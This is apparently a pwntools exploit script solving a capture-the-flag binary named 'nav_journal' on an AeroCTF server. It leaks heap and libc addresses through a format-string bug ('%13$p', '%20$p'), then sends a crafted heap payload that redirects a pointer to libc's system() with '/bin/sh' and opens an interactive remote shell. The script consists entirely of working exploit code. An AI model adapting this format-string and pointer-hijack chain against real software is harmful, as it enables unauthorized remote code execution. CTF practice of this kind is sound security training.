import pwn

HOST, PORT = 'tasks.aeroctf.com', 33013
DEBUG = False

if DEBUG:
    env = {'LD_PRELOAD': './libc.so.6'}
    p = pwn.process(['./ld-2.23.so', './nav_journal'], env=env)
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'

libc = pwn.ELF('./libc.so.6')


def Menu(i):
    p.recvuntil('> ')
    p.sendline(str(i))


def FSB(fstr):
    Menu(4)
    p.recvuntil('{?} Do you agree with this name?[Y\\N]: ')
    p.sendline('N')
    p.recvuntil('{?} Enter your name: ')

    payload = fstr.encode()
    payload = payload.ljust(6, b'\x00')
    p.send(payload)

    p.recvuntil('/tmp/')
    return int(p.recvuntil('-', drop=True), 16)


p.recvuntil('Enter your name: ')
p.sendline('ironore15')

heap_base = FSB('%13$p') - 0x618
pwn.log.info('[heap]: 0x{:08X}'.format(heap_base))
Menu(7)

libc_base = FSB('%20$p') - 0x1B2000
pwn.log.info('libc.so.6: 0x{:08X}'.format(libc_base))

Menu(5)
p.recvuntil('{?} Enter data: ')

payload = b'/bin/sh\x00'
payload = payload.ljust(0x48, b'\x00')
payload += pwn.p32(heap_base + 0x208)
payload = payload.ljust(0x94, b'\x00')
payload += pwn.p32(heap_base + 0x408)
payload = payload.ljust(0x400, b'\x00')
payload += pwn.p32(0) * 17
payload += pwn.p32(libc_base + libc.symbols[b'system'])
payload = payload.ljust(0x600, b'\x00')
payload += pwn.p32(heap_base + 0x8)

p.send(payload)

Menu(3)

pwn.context.log_level = 'INFO'
p.interactive()
